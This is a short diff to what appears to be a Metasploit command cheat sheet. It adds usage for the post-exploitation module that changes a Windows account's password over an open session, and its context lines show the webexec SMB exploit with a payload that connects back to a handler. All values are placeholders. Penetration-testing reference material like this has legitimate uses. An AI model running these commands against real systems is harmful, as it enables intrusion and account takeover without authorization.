@@ -268,6 +268,22 @@ use exploit/windows/smb/webexec
 run -o SMBPass=<password>,SMBUser=<user>,SMBDomain=<domain>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
 ```
 
+# Change password
+## Options
+```ruby
+use post/windows/manage/change_password
+set OLD_PASSWORD <old_password>
+set NEW_PASSWORD <new_password>
+set SESSION <1>
+set SMBDomain <domain>
+set SMBUser <user>
+```
+## Run
+```ruby
+use post/windows/manage/change_password
+run -o OLD_PASSWORD=<old_password>,NEW_PASSWORD=<new_password>,SESSION=<1>,SMBDomain=<domain>,SMBUser=<user>
+```
+
 # Mimikatz
 ## Meterpreter
 ### Change password
